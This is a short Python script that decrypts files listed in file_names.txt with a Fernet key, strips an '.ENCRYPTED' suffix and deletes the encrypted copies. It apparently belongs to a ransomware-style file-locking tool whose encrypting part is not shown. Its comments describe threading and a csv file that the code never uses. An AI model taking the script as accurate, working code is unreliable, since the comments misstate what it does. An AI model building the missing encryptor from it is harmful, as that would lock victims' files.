from cryptography.fernet import Fernet
import threading
import ctypes
import sys
import os
#run code as administartor



with open("key.key", "r") as key_file:
    key = key_file.read()
    key_file.close()


fernet = Fernet(key)


def decrypt(file_path):
    #decrypt the file then remove .ENCRYPTED
    with open(file_path, "rb") as file:
        file_data = file.read()
        decrypted_file = fernet.decrypt(file_data)
        with open(file_path.removesuffix(".ENCRYPTED"), "wb") as decrypted_fil:
            decrypted_fil.write(decrypted_file)
            decrypted_fil.close()
        file.close()
    os.remove(file_path)

#get the file names from the csv file
with open("file_names.txt", "r") as file_names:
    file_names_list = file_names.readlines()
    file_names.close()
#start a thread for each file to decrypt it
for files in file_names_list:
    file = files.removesuffix("\n")
    decrypt(file)
#wait for all threads to finish
for thread in threading.enumerate():
    if thread is not threading.currentThread():
        thread.join()
